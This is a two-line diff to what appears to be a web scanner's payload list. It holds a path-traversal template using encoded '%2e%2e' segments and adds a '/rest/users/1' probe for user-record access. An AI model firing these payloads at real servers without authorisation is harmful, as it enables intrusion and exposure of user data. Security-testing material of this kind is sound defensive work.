@@ -1,1 +1,2 @@
 /{{projectName}}/~site////////%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e{{path}}
+/rest/users/1
